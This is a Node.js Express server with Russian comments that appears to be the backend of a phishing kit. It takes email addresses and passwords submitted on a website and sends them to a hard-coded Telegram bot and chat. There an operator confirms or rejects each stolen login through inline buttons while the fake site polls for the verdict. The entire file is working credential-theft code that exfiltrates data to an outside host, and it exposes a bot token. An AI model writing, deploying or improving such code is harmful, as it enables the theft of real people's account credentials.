const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

let requests = {}; // Тут храним статусы проверок { userId: 'pending' | 'success' | 'error' }

const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
const chatId = '-1003894478662';

// 1. Прием данных с сайта
app.post('/send-data', async (req, res) => {
    const { userId, email, pass } = req.body;
    requests[userId] = 'pending';

    const message = `⚠️ **Данные входа**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;
    
    // Отправляем в ТГ с кнопками
    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "✅ Верно", callback_data: `approve_${userId}` },
                    { text: "❌ Ошибка", callback_data: `reject_${userId}` }
                ]
            ]
        }
    });

    res.json({ status: 'sent' });
});

// 2. Эндпоинт для проверки статуса сайтом
app.get('/check-status/:userId', (req, res) => {
    const status = requests[req.params.userId] || 'not_found';
    res.json({ status });
});

// 3. Прием ответа от кнопок Telegram (WebHook или обработка Callback)
// ВАЖНО: Тебе нужно настроить Webhook бота на этот адрес или использовать библиотеку
app.post('/tg-webhook', (req, res) => {
    const callbackQuery = req.body.callback_query;
    if (callbackQuery) {
        const data = callbackQuery.data; // approve_123
        const [action, userId] = data.split('_');

        if (action === 'approve') {
            requests[userId] = 'success';
        } else {
            requests[userId] = 'error';
        }
        
        // Редактируем сообщение в ТГ, чтобы убрать кнопки
        axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
            callback_query_id: callbackQuery.id,
            text: "Принято!"
        });
    }
    res.sendStatus(200);
});
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
